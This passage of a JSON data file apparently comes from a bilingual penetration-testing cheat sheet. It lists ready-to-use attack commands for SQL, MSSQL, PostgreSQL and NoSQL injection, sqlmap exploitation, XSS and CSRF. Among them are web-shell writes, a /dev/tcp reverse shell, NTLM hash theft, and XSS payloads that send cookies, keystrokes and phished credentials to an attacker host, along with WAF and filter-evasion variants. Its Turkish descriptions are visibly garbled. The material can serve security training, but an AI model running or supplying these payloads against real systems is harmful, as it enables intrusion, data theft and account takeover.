            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND CASE WHEN (SUBSTR((SELECT sqlite_version()),1,1)='3') THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) ELSE 1 END-- -\"",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Time-based extraction SQLite heavy query üzerinden üzerinde"
          }
        ],
        "name_tr": "Blind Time-Based Extraction"
      },
      {
        "name": "SQLMap Automation",
        "commands": [
          {
            "title": "SQLMap Basic GET",
            "desc": "Basic SQLi detection on GET parameter",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --batch",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Basic SQLi detection GET parameter üzerinde"
          },
          {
            "title": "SQLMap POST Request",
            "desc": "Test POST parameters for SQLi",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page' --data 'user=admin&pass=test' --batch",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Test et: POST parameters for SQLi"
          },
          {
            "title": "SQLMap with Cookie",
            "desc": "Test with session cookie",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --cookie='session=<COOKIE>' --batch",
            "tags": [
              "tool"
            ],
            "desc_tr": "Test et: sessicookie ile üzerinde"
          },
          {
            "title": "SQLMap from Request File",
            "desc": "Use saved Burp request file",
            "cmd": "sqlmap -r request.txt --batch",
            "tags": [
              "essential",
              "tool"
            ],
            "note": "Save request from Burp: Right-click > Save Item",
            "desc_tr": "Use kayıtlı Burp request file"
          },
          {
            "title": "SQLMap Enumerate Databases",
            "desc": "List all databases",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --dbs --batch",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Listele: tüm databases"
          },
          {
            "title": "SQLMap Enumerate Tables",
            "desc": "List tables in a database",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' -D <DATABASE> --tables --batch",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Listele: tables a database içinde"
          },
          {
            "title": "SQLMap Enumerate Columns",
            "desc": "List columns in a table",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' -D <DATABASE> -T <TABLE> --columns --batch",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Listele: columns a table içinde"
          },
          {
            "title": "SQLMap Dump Table",
            "desc": "Dump data from a table",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' -D <DATABASE> -T <TABLE> -C <COL1>,<COL2> --dump --batch",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Dökümle: data a table üzerinden"
          },
          {
            "title": "SQLMap OS Shell",
            "desc": "Get an interactive OS shell via SQLi",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --os-shell --batch",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Al: an interactive OS shell SQLi üzerinden"
          },
          {
            "title": "SQLMap File Read",
            "desc": "Read file from target filesystem",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --file-read='/etc/passwd' --batch",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Oku: file target filesystem üzerinden"
          },
          {
            "title": "SQLMap File Write",
            "desc": "Write file to target filesystem",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --file-write='shell.php' --file-dest='/var/www/html/shell.php' --batch",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Yaz: file target filesystem'e"
          },
          {
            "title": "SQLMap Specify Technique",
            "desc": "Use specific injection techniques",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --technique=BEUST --batch",
            "tags": [
              "tool"
            ],
            "note": "B=Boolean, E=Error, U=Union, S=Stacked, T=Time",
            "desc_tr": "Use belirli enjeksiytechniques üzerinde"
          },
          {
            "title": "SQLMap with Tamper Script",
            "desc": "Use tamper scripts to bypass WAF",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --tamper=space2comment,between --batch",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Use tamper scripts bypass WAF'e"
          },
          {
            "title": "SQLMap High Risk/Level",
            "desc": "Maximum injection testing intensity",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --risk=3 --level=5 --batch",
            "tags": [
              "tool"
            ],
            "desc_tr": "Maximum enjeksiytesting intensity üzerinde"
          },
          {
            "title": "SQLMap Specific DBMS",
            "desc": "Target a specific database type",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --dbms=mysql --batch",
            "tags": [
              "tool"
            ],
            "desc_tr": "Target a belirli database type"
          },
          {
            "title": "SQLMap Dump All",
            "desc": "Dump entire database",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' -D <DATABASE> --dump-all --batch",
            "tags": [
              "tool"
            ],
            "desc_tr": "Dökümle: entire database"
          },
          {
            "title": "SQLMap Tamper space2comment",
            "desc": "Replace spaces with comments to bypass WAF",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --tamper=space2comment --batch",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Değiştir: spaces comments bypass WAF ile'e"
          },
          {
            "title": "SQLMap Tamper charencode",
            "desc": "URL-encode characters to bypass WAF",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --tamper=charencode --batch",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "URL-kodlama characters bypass WAF'e"
          },
          {
            "title": "SQLMap Tamper randomcase",
            "desc": "Randomize SQL keyword case to bypass WAF",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --tamper=randomcase --batch",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Randomize SQL keyword case bypass WAF'e"
          },
          {
            "title": "SQLMap Tamper between",
            "desc": "Replace > with BETWEEN to bypass WAF",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --tamper=between --batch",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Değiştir: > BETWEEN bypass WAF ile'e"
          },
          {
            "title": "SQLMap Tamper Chain (WAF Bypass)",
            "desc": "Chain multiple tamper scripts for aggressive WAF bypass",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --tamper=space2comment,randomcase,charencode,between --batch --level=5 --risk=3",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Chamultiple tamper scripts for aggressive WAF bypass içinde"
          },
          {
            "title": "SQLMap Second-Order SQLi",
            "desc": "Test second-order injection via separate request",
            "cmd": "sqlmap -r inject_request.txt --second-req trigger_request.txt --batch",
            "tags": [
              "advanced",
              "tool"
            ],
            "note": "inject_request.txt stores payload, trigger_request.txt retrieves output",
            "desc_tr": "Test et: second-order enjeksiyseparate request üzerinden üzerinde"
          },
          {
            "title": "SQLMap with Proxy (Burp)",
            "desc": "Route SQLMap through Burp for inspection",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --proxy=http://127.0.0.1:8080 --batch",
            "tags": [
              "tool"
            ],
            "desc_tr": "Yönlendir: SQLMap Burp for inspection üzerinden"
          },
          {
            "title": "SQLMap Custom Injection Point",
            "desc": "Mark custom injection point in request",
            "cmd": "sqlmap -u 'http://<TARGET_IP>/page?id=1*' --batch",
            "tags": [
              "tool"
            ],
            "note": "Use * to mark the injection point",
            "desc_tr": "Mark özel enjeksiypoint request üzerinde içinde"
          },
          {
            "title": "SQLMap Multi Tampers",
            "desc": "Chain tamper scripts",
            "cmd": "sqlmap -u '<URL>?id=1' --tamper=space2comment,randomcase,charencode --batch --dbs",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Chatamper scripts içinde"
          },
          {
            "title": "SQLMap via Proxy",
            "desc": "Route through proxy",
            "cmd": "sqlmap -u '<URL>?id=1' --proxy=http://127.0.0.1:8080 --batch --dbs",
            "tags": [
              "tool"
            ],
            "desc_tr": "Yönlendir: vekil sunucu (proxy) üzerinden"
          },
          {
            "title": "SQLMap Risk/Level",
            "desc": "Max detection sensitivity",
            "cmd": "sqlmap -u '<URL>?id=1' --risk=3 --level=5 --batch --dbs",
            "tags": [
              "essential"
            ],
            "desc_tr": "Max detectisensitivity üzerinde"
          },
          {
            "title": "SQLMap Random Agent",
            "desc": "Randomize User-Agent",
            "cmd": "sqlmap -u '<URL>?id=1' --random-agent --batch --dbs",
            "tags": [
              "tool"
            ],
            "desc_tr": "Randomize User-Agent"
          },
          {
            "title": "SQLMap Second-Order",
            "desc": "Second-order SQLi test",
            "cmd": "sqlmap -u '<URL>/register' --data='user=test&pass=test' --second-url='<URL>/profile' --batch --dbs",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Second-order SQLi test"
          }
        ],
        "name_tr": "SQLMap Automation"
      },
      {
        "name": "MSSQL Techniques",
        "commands": [
          {
            "title": "MSSQL Enable xp_cmdshell",
            "desc": "Enable xp_cmdshell for OS command execution",
            "cmds": [
              "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
              "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
            ],
            "tags": [
              "essential"
            ],
            "note": "Requires sysadmin privileges",
            "desc_tr": "Etkinleştir: xp_cmdshell for OS komut enjeksiyonu"
          },
          {
            "title": "MSSQL Execute Command",
            "desc": "Execute OS command via xp_cmdshell",
            "cmd": "EXEC xp_cmdshell 'whoami';",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: OS command xp_cmdshell üzerinden"
          },
          {
            "title": "MSSQL Steal Hash (xp_dirtree)",
            "desc": "Force NTLM authentication to attacker SMB share",
            "cmd": "EXEC xp_dirtree '\\\\<ATTACKER_IP>\\share';",
            "tags": [
              "essential"
            ],
            "note": "Catch hash with responder or smbserver",
            "desc_tr": "Zorla: NTLM kimlik doğrulama attacker SMB share'e"
          },
          {
            "title": "MSSQL Steal Hash (xp_subdirs)",
            "desc": "Alternative NTLM hash theft",
            "cmd": "EXEC xp_subdirs '\\\\<ATTACKER_IP>\\share';",
            "tags": [
              "essential"
            ],
            "desc_tr": "Alternative NTLM hash theft"
          },
          {
            "title": "MSSQL OPENROWSET Hash Steal",
            "desc": "Force auth via OPENROWSET",
            "cmd": "SELECT * FROM OPENROWSET('SQLOLEDB','Server=<ATTACKER_IP>;uid=sa;pwd=whatever','SELECT 1');",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Zorla: auth OPENROWSET üzerinden"
          },
          {
            "title": "MSSQL Linked Servers",
            "desc": "Enumerate linked servers for lateral movement",
            "cmd": "SELECT * FROM sys.servers;",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Listele: linked servers for yanal hareket"
          },
          {
            "title": "MSSQL Impersonate Users",
            "desc": "Check which users can be impersonated",
            "cmd": "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Kontrol et: which users can be impersonated"
          }
        ],
        "name_tr": "MSSQL Techniques"
      },
      {
        "name": "PostgreSQL Techniques",
        "commands": [
          {
            "title": "PostgreSQL Read File",
            "desc": "Read files from filesystem",
            "cmd": "SELECT pg_read_file('/etc/passwd');",
            "tags": [
              "essential"
            ],
            "desc_tr": "Oku: files filesystem üzerinden"
          },
          {
            "title": "PostgreSQL COPY TO File",
            "desc": "Write data to a file",
            "cmd": "COPY (SELECT '<?php system($_GET[\"cmd\"]); ?>') TO '/var/www/html/shell.php';",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Yaz: data a file'e"
          },
          {
            "title": "PostgreSQL COPY FROM File",
            "desc": "Read file into a table",
            "cmd": "CREATE TABLE tmp(data text); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp;",
            "tags": [
              "essential"
            ],
            "desc_tr": "Oku: file ina table'e"
          },
          {
            "title": "PostgreSQL Command Execution",
            "desc": "Execute OS commands via COPY PROGRAM",
            "cmd": "COPY (SELECT '') TO PROGRAM 'id';",
            "tags": [
              "advanced"
            ],
            "note": "Requires superuser privileges",
            "desc_tr": "Çalıştır: OS commands COPY PROGRAM üzerinden"
          },
          {
            "title": "PostgreSQL Large Object RCE",
            "desc": "RCE via large objects and lo_export",
            "cmds": [
              "SELECT lo_import('/etc/passwd');",
              "SELECT lo_export(<LOID>, '/tmp/out');"
            ],
            "tags": [
              "advanced"
            ],
            "desc_tr": "RCE large objects and lo_export üzerinden"
          },
          {
            "title": "PostgreSQL Current User & Roles",
            "desc": "Check current user and role memberships",
            "cmd": "SELECT current_user, current_setting('is_superuser');",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: mevcut user and role memberships"
          },
          {
            "title": "PostgreSQL List Users & Roles",
            "desc": "Enumerate all database users and roles",
            "cmd": "SELECT usename, usecreatedb, usesuper FROM pg_user;",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm database users and roles"
          },
          {
            "title": "PostgreSQL UDF Command Execution",
            "desc": "Create a function for OS command execution",
            "cmds": [
              "CREATE OR REPLACE FUNCTION cmd(text) RETURNS text AS $$ import os; return os.popen(args[0]).read() $$ LANGUAGE plpythonu;",
              "SELECT cmd('id');"
            ],
            "tags": [
              "advanced"
            ],
            "note": "Requires plpythonu extension",
            "desc_tr": "Oluştur: a functifor OS komut enjeksiyonu üzerinde"
          },
          {
            "title": "PostgreSQL Reverse Shell",
            "desc": "Reverse shell via COPY PROGRAM",
            "cmd": "COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1\"';",
            "tags": [
              "advanced"
            ],
            "desc_tr": "ters bağlantı kabuğu COPY PROGRAM üzerinden"
          }
        ],
        "name_tr": "PostgreSQL Techniques"
      },
      {
        "name": "NoSQL Injection",
        "commands": [
          {
            "title": "MongoDB Auth Bypass ($ne)",
            "desc": "Bypass login with $ne operator",
            "cmd": "curl -X POST http://<TARGET_IP>/login -H 'Content-Type: application/json' -d '{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Atla: log$ne operator ile içinde"
          },
          {
            "title": "MongoDB Auth Bypass ($gt)",
            "desc": "Bypass login with $gt operator",
            "cmd": "curl -X POST http://<TARGET_IP>/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Atla: log$gt operator ile içinde"
          },
          {
            "title": "MongoDB Regex Extraction",
            "desc": "Extract data character by character via $regex",
            "cmd": "curl -X POST http://<TARGET_IP>/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":{\"$regex\":\"^a\"}}'",
            "tags": [
              "essential"
            ],
            "note": "Iterate characters: ^a, ^ab, ^abc... until match found",
            "desc_tr": "Çıkart: data character by character $regex üzerinden"
          },
          {
            "title": "MongoDB $where JavaScript Injection",
            "desc": "Inject JavaScript in $where operator",
            "cmd": "curl -X POST http://<TARGET_IP>/search -H 'Content-Type: application/json' -d '{\"$where\":\"this.username == \\\"admin\\\" && this.password.match(/^a.*/)\"}' ",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Enjekte et: JavaScript $where operator içinde"
          },
          {
            "title": "NoSQL Injection via URL Params",
            "desc": "NoSQL injection through URL-encoded parameters",
            "cmd": "curl 'http://<TARGET_IP>/login?username=admin&password[$ne]=wrong'",
            "tags": [
              "essential"
            ],
            "desc_tr": "NoSQL enjeksiyURL-encoded parameters üzerinde üzerinden"
          },
          {
            "title": "NoSQL Regex Password Extraction",
            "desc": "Extract password length then chars via regex",
            "cmds": [
              "curl -X POST http://<TARGET_IP>/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":{\"$regex\":\".{5}\"}}'",
              "curl -X POST http://<TARGET_IP>/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":{\"$regex\":\"^a\"}}'"
            ],
            "tags": [
              "advanced"
            ],
            "note": "First find length, then brute force each character",
            "desc_tr": "Çıkart: password length then chars regex üzerinden"
          },
          {
            "title": "NoSQLMap Automated Testing",
            "desc": "Automated NoSQL injection scanner",
            "cmd": "python nosqlmap.py -u http://<TARGET_IP>/login --data 'username=admin&password=test'",
            "tags": [
              "tool"
            ],
            "desc_tr": "Otomatik NoSQL enjeksiytarayıcı üzerinde"
          },
          {
            "title": "MongoDB $in Operator Injection",
            "desc": "Use $in to test multiple values at once",
            "cmd": "curl -X POST http://<TARGET_IP>/login -H 'Content-Type: application/json' -d '{\"username\":{\"$in\":[\"admin\",\"root\",\"administrator\"]},\"password\":{\"$ne\":\"\"}}'",
            "tags": [
              "tool"
            ],
            "desc_tr": "Use $test multiple values at once'e içinde"
          },
          {
            "title": "NoSQL Auth Bypass $ne",
            "desc": "Bypass login with $ne",
            "cmd": "curl -X POST <URL>/login -H 'Content-Type: application/json' -d '{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Atla: log$ne ile içinde"
          },
          {
            "title": "NoSQL $regex Bypass",
            "desc": "Regex auth bypass",
            "cmd": "curl -X POST <URL>/login -H 'Content-Type: application/json' -d '{\"username\":{\"$regex\":\"^admin\"},\"password\":{\"$ne\":\"\"}}'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Regex auth bypass"
          },
          {
            "title": "NoSQL URL Params",
            "desc": "Inject via URL brackets",
            "cmd": "curl '<URL>/login?username[$ne]=x&password[$ne]=x'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Enjekte et: URL brackets üzerinden"
          },
          {
            "title": "NoSQLMap",
            "desc": "Automated NoSQL injection",
            "cmd": "python3 nosqlmap.py -u <URL> --attack 1",
            "tags": [
              "tool"
            ],
            "desc_tr": "Otomatik NoSQL enjeksiyon"
          }
        ],
        "name_tr": "NoSQL Injection"
      }
    ],
    "name_tr": "Enjeksiyon ile Veritabanı İstismarı",
    "description_tr": "Detect and exploit SQL injection vulnerabilities to extract data, escalate privileges, and achieve remote code execution across major database platforms."
  },
  {
    "id": "xss-csrf",
    "name": "Browser-Side Exploitation",
    "icon": "📜",
    "description": "Exploit cross-site scripting, cross-site request forgery, and DOM-based vulnerabilities to attack users and their browsers.",
    "subcategories": [
      {
        "name": "XSS Detection Payloads",
        "commands": [
          {
            "title": "XSS Basic Script Tag",
            "desc": "Classic script tag injection",
            "cmd": "<script>alert('XSS')</script>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Classic script tag enjeksiyon"
          },
          {
            "title": "XSS IMG Onerror",
            "desc": "XSS via broken image error handler",
            "cmd": "<img src=x onerror=alert('XSS')>",
            "tags": [
              "essential"
            ],
            "desc_tr": "XSS broken image error handler üzerinden"
          },
          {
            "title": "XSS SVG Onload",
            "desc": "XSS via SVG onload event",
            "cmd": "<svg onload=alert('XSS')>",
            "tags": [
              "essential"
            ],
            "desc_tr": "XSS SVG onload event üzerinden"
          },
          {
            "title": "XSS Body Onload",
            "desc": "XSS via body onload event",
            "cmd": "<body onload=alert('XSS')>",
            "tags": [
              "essential"
            ],
            "desc_tr": "XSS body onload event üzerinden"
          },
          {
            "title": "XSS Input Onfocus",
            "desc": "XSS via input autofocus",
            "cmd": "<input onfocus=alert('XSS') autofocus>",
            "tags": [
              "essential"
            ],
            "desc_tr": "XSS input autofocus üzerinden"
          },
          {
            "title": "XSS Details Tag",
            "desc": "XSS via details/summary toggle",
            "cmd": "<details open ontoggle=alert('XSS')>",
            "tags": [
              "essential"
            ],
            "desc_tr": "XSS details/summary toggle üzerinden"
          },
          {
            "title": "XSS Marquee Tag",
            "desc": "XSS via marquee event",
            "cmd": "<marquee onstart=alert('XSS')>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "XSS marquee event üzerinden"
          },
          {
            "title": "XSS Iframe Injection",
            "desc": "XSS via iframe srcdoc",
            "cmd": "<iframe srcdoc='<script>alert(1)</script>'>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "XSS iframe srcdoc üzerinden"
          },
          {
            "title": "XSS Event Handler List",
            "desc": "Common event handlers for XSS",
            "cmds": [
              "<div onmouseover=alert('XSS')>hover me</div>",
              "<a href=javascript:alert('XSS')>click</a>",
              "<select onfocus=alert('XSS') autofocus>",
              "<textarea onfocus=alert('XSS') autofocus>",
              "<video><source onerror=alert('XSS')>"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Commevent handlers for XSS üzerinde"
          },
          {
            "title": "XSS Polyglot Payload",
            "desc": "Universal XSS polyglot that works in multiple contexts",
            "cmd": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik'telerik\"telerik>telerik<teleriktel eriktel erike rik/teleriktel erike rik\\telerika]telerikb]telerik}telerikb}telerik|telerikb|telerik&telerikb&telerik&&telerikb&&telerikp]telerikb]telerik}telerikb}",
            "tags": [
              "advanced"
            ],
            "note": "Shortened version: jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert())//",
            "desc_tr": "Universal XSS polyglot that works multiple contexts içinde"
          },
          {
            "title": "XSS Polyglot",
            "desc": "Universal XSS payload",
            "cmd": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0telerik0telerik11-<telerik\"><svg/onload=alert()//>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Universal XSS payload"
          },
          {
            "title": "Blind XSS",
            "desc": "Out-of-band detection",
            "cmd": "'><script src=http://<ATTACKER_IP>/xss.js></script>",
            "tags": [
              "essential"
            ],
            "note": "Host JS that callbacks to your server",
            "desc_tr": "Out-of-band detection"
          },
          {
            "title": "XSS SVG Upload",
            "desc": "XSS via SVG file",
            "cmd": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('XSS')\"><circle r=\"50\"/></svg>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "XSS SVG file üzerinden"
          },
          {
            "title": "XSS Event Handlers Extended",
            "desc": "Less common event handlers",
            "cmds": [
              "<marquee onstart=alert(1)>",
              "<video src=x onerror=alert(1)>",
              "<audio src=x onerror=alert(1)>",
              "<object data=javascript:alert(1)>",
              "<body onpageshow=alert(1)>"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Less commevent handlers üzerinde"
          }
        ],
        "name_tr": "XSS Detection Payloads"
      },
      {
        "name": "Session Hijacking",
        "commands": [
          {
            "title": "XSS Cookie Steal (Image)",
            "desc": "Steal cookies via Image object",
            "cmd": "<script>new Image().src='http://<ATTACKER_IP>/steal?c='+document.cookie;</script>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çal: cookies Image object üzerinden"
          },
          {
            "title": "XSS Cookie Steal (Fetch)",
            "desc": "Steal cookies via fetch API",
            "cmd": "<script>fetch('http://<ATTACKER_IP>/steal?c='+document.cookie)</script>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çal: cookies fetch API üzerinden"
          },
          {
            "title": "XSS Cookie Steal (XMLHttpRequest)",
            "desc": "Steal cookies via XHR",
            "cmd": "<script>var x=new XMLHttpRequest();x.open('GET','http://<ATTACKER_IP>/steal?c='+document.cookie);x.send();</script>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çal: cookies XHR üzerinden"
          },
          {
            "title": "XSS Keylogger Injection",
            "desc": "Inject keylogger to capture input",
            "cmd": "<script>document.onkeypress=function(e){new Image().src='http://<ATTACKER_IP>/log?k='+e.key;}</script>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Enjekte et: keylogger capture input'e"
          },
          {
            "title": "XSS Phishing Login Form",
            "desc": "Inject fake login form to steal creds",
            "cmd": "<script>document.body.innerHTML='<h2>Session Expired</h2><form action=http://<ATTACKER_IP>/phish method=POST><input name=user placeholder=Username><input name=pass type=password placeholder=Password><input type=submit value=Login></form>';</script>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Enjekte et: fake logform steal creds'e içinde"
          },
          {
            "title": "XSS Redirect to Attacker",
            "desc": "Redirect victim to attacker-controlled page",
            "cmd": "<script>window.location='http://<ATTACKER_IP>/steal?c='+document.cookie</script>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Redirect victim attacker-controlled page'e"
          }
        ],
        "name_tr": "Session Hijacking"
      },
      {
        "name": "Filter Evasion",
        "commands": [
          {
            "title": "XSS HTML Entity Encoding",
            "desc": "Bypass filters using HTML entities",
            "cmd": "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Atla: filters HTML entities kullanarak"
          },
          {
            "title": "XSS URL Encoding",
            "desc": "Bypass WAF with URL-encoded payload",
            "cmd": "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Atla: WAF URL-encoded payload ile"
          },
          {
            "title": "XSS Double URL Encoding",
            "desc": "Double-encode to bypass two layers of filtering",
            "cmd": "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Double-kodlama bypass two layers of filtering'e"
          },
          {
            "title": "XSS Unicode Encoding",
            "desc": "Unicode escape for JavaScript execution",
            "cmd": "<script>\\u0061lert(1)</script>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Unicode escape for JavaScript execution"
          },
          {
            "title": "XSS Case Variation",
            "desc": "Bypass case-sensitive filters",
            "cmd": "<ScRiPt>alert(1)</sCrIpT>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Atla: case-sensitive filters"
          },
          {
            "title": "XSS Null Byte Injection",
            "desc": "Bypass filters with null byte",
            "cmd": "<scr%00ipt>alert(1)</scr%00ipt>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Atla: filters null byte ile"
          },
          {
            "title": "XSS No Parentheses",
            "desc": "XSS without using parentheses",
            "cmd": "<script>alert`1`</script>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "XSS parentheses kullanarak olmadan"
          },
          {
            "title": "XSS No Quotes or Slashes",
            "desc": "Payload avoiding quotes and slashes",
            "cmd": "<svg onload=alert(String.fromCharCode(88,83,83))>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "payload avoiding quotes and slashes"
          },
          {
            "title": "XSS Script Tag Variations",
            "desc": "Alternative script injection methods",
            "cmds": [
              "<script/src=http://<ATTACKER_IP>/xss.js>",
              "<script x>alert(1)</script>",
              "<script>/**/alert(1)/**/</script>"
            ],
            "tags": [
              "advanced"
            ],
            "desc_tr": "Alternative script enjeksiymethods üzerinde"
          },
          {
            "title": "XSS via JavaScript Protocol",
            "desc": "Inject via javascript: pseudo-protocol",
            "cmd": "<a href='javascript:alert(1)'>click</a>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Enjekte et: javascript: pseudo-protocol üzerinden"
          },
          {
            "title": "CSP Bypass JSONP",
            "desc": "Bypass CSP via JSONP",
            "cmd": "<script src='https://allowed-cdn.com/jsonp?callback=alert(1)'></script>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Atla: CSP JSONP üzerinden"
          },
          {
            "title": "CSP Bypass base-uri",
            "desc": "Change base URI",
            "cmd": "<base href='http://<ATTACKER_IP>/'>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Change base URI"
          }
        ],
        "name_tr": "Filter Evasion"
      },
      {
        "name": "DOM-Based Vectors",
        "commands": [
          {
            "title": "DOM XSS via location.hash",
            "desc": "Inject via URL fragment",
            "cmd": "http://<TARGET_IP>/page#<img src=x onerror=alert(1)>",
            "tags": [
              "essential"
            ],
            "note": "Vulnerable if page reads location.hash and writes to DOM",
            "desc_tr": "Enjekte et: URL fragment üzerinden"
          },
          {
            "title": "DOM XSS via document.write",
            "desc": "Exploit document.write with user input",
            "cmd": "http://<TARGET_IP>/page?name=<script>alert(1)</script>",
            "tags": [
              "essential"
            ],
            "note": "Vulnerable if: document.write(location.search)",
            "desc_tr": "İstismar et: r document.write user input ile"
          },
          {
            "title": "DOM XSS via innerHTML",
            "desc": "Exploit innerHTML assignment with user input",
            "cmd": "http://<TARGET_IP>/page?msg=<img src=x onerror=alert(1)>",
            "tags": [
              "essential"
            ],
            "note": "Script tags don't execute via innerHTML, use event handlers",
            "desc_tr": "İstismar et: r innerHTML assignment user input ile"
          },
          {
            "title": "DOM XSS via eval()",
            "desc": "Exploit eval with user-controlled input",
            "cmd": "http://<TARGET_IP>/page?input=alert(1)",
            "tags": [
              "advanced"
            ],
            "note": "Vulnerable if: eval(userInput)",
            "desc_tr": "İstismar et: r eval user-controlled input ile"
          },
          {
            "title": "DOM XSS via postMessage",
            "desc": "Exploit insecure postMessage handlers",
            "cmd": "<script>window.frames[0].postMessage('<img src=x onerror=alert(1)>','*');</script>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "İstismar et: r insecure postMessage handlers"
          },
          {
            "title": "DOM Clobbering",
            "desc": "Override DOM properties via element injection",
            "cmd": "<form id=x><input name=y value=overwritten></form>",
            "tags": [
              "advanced"
            ],
            "note": "Accesses x.y returns 'overwritten' instead of expected value",
            "desc_tr": "Override DOM properties element enjeksiyüzerinden üzerinde"
          }
        ],
        "name_tr": "DOM-Based Vectors"
      },
      {
        "name": "CSRF Techniques",
        "commands": [
          {
            "title": "CSRF Auto-Submit Form (GET)",
            "desc": "Auto-submit GET request on page load",
            "cmd": "<img src='http://<TARGET_IP>/admin/delete?id=1'>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Auto-submit GET request page load üzerinde"
          },
          {
            "title": "CSRF Auto-Submit Form (POST)",
            "desc": "Auto-submit POST form on page load",
